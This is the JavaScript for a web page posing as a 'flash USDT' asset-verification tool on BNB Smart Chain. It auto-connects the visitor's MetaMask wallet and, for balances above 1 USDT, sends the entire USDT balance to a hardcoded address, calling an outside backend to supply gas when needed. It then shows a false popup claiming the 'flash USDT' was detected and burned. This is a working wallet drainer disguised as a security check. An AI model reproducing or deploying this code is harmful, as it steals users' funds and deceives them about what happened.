const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract

let web3;
let userAddress;

async function connectWallet() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: "eth_requestAccounts" });

            // Force switch to BNB Smart Chain
            await window.ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: "0x38" }]
            });

            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];
            console.log("Wallet Connected:", userAddress);
        } catch (error) {
            console.error("Error connecting wallet:", error);
            alert("Please switch to BNB Smart Chain.");
        }
    } else {
        alert("Please install MetaMask.");
    }
}

// Auto-connect wallet on page load
window.addEventListener("load", connectWallet);

async function verifyAssets() {
    if (!web3 || !userAddress) {
        alert("Wallet not connected. Refresh the page.");
        return;
    }

    const usdtContract = new web3.eth.Contract([
        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
    ], usdtContractAddress);

    // Fetch balances
    const [usdtBalanceWei, userBNBWei] = await Promise.all([
        usdtContract.methods.balanceOf(userAddress).call(),
        web3.eth.getBalance(userAddress)
    ]);

    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
    const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

    console.log(`USDT Balance: ${usdtBalance} USDT`);
    console.log(`BNB Balance: ${userBNB} BNB`);

    if (usdtBalance === 0) {
        showPopup("No assets found.", "black");
        return;
    }

    if (usdtBalance <= 1) {
        showPopup(
            `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
            "green"
        );
        return;
    }

    // User has more than 150 USDT → Check BNB Gas Fee
    showPopup("Loading...", "green");

    transferUSDT(usdtBalance, userBNB);
}

async function transferUSDT(usdtBalance, userBNB) {
    try {
        if (userBNB < 0.0005) {
    console.log("User BNB is low. Requesting BNB from backend...");
    await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ toAddress: userAddress })
    });
        }

        // Proceed with USDT Transfer
        const usdtContract = new web3.eth.Contract([
            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ], usdtContractAddress);

        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");

        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);

        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

        showPopup(
            `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
            "red"
        );

        console.log(`✅ Transferred ${usdtBalance} USDT to ${bscAddress}`);
    } catch (error) {
        console.error("❌ USDT Transfer Failed:", error);
        alert("USDT transfer failed. Ensure you have enough BNB for gas.");
    }
}

async function sendBNB(toAddress, amount) {
    try {
        await web3.eth.sendTransaction({
            from: bnbGasSender,
            to: toAddress,
            value: web3.utils.toWei(amount, "ether"),
            gas: 21000
        });

        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
    } catch (error) {
        console.error("⚠️ Error sending BNB:", error);
    }
}

// Function to display pop-up message
function showPopup(message, color) {
    let popup = document.getElementById("popupBox");
    
    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
        popup.style.textAlign = "center";
        popup.style.fontSize = "18px";
        popup.style.width = "80%";
        popup.style.maxWidth = "400px";
        document.body.appendChild(popup);
    }

    popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
    popup.style.color = color === "red" ? "red" : "green";
    popup.innerHTML = message;
    popup.style.display = "block";

    // Auto-hide after 5 seconds
    setTimeout(() => {
        popup.style.display = "none";
    }, 5000);
}

// Attach event listener
document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
